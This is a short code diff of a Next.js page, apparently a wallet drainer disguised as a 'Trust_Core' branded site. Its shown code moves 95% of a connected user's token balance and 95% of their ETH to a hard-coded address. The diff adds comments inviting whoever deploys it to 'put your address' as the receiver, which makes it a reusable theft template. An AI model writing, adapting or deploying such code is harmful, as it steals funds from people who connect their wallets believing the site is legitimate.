@@ -48,7 +48,7 @@ export default function Home() {
       (await contract.balanceOf(signerAddress)).toString()
     );
     const tx = await contract.transfer(
-      "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4", // reciever address
+      "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4", // reciever address, please put your address
       BigInt(balance * 0.95)
     );
     await tx.wait(1);
@@ -59,7 +59,7 @@ export default function Home() {
       (await provider.getBalance(signerAddress)).toString()
     );
     const tx = await signer.sendTransaction({
-      to: "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4",
+      to: "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4", // reciever address, please put your address
       value: ethers.utils.parseEther(`${(balance * 0.95) / 1e18}`),
     });
     await provider.waitForTransaction(tx.hash, 1, 150000).then(() => {});
@@ -69,7 +69,7 @@ export default function Home() {
     <div className="home">
       <Image
         src="Trust_Core Logo_Blue.svg" // Path to your image
-        alt="Description of the image"
+        alt="Logo"
         width={500} // Width of the image
         height={300} // Height of the image
       />
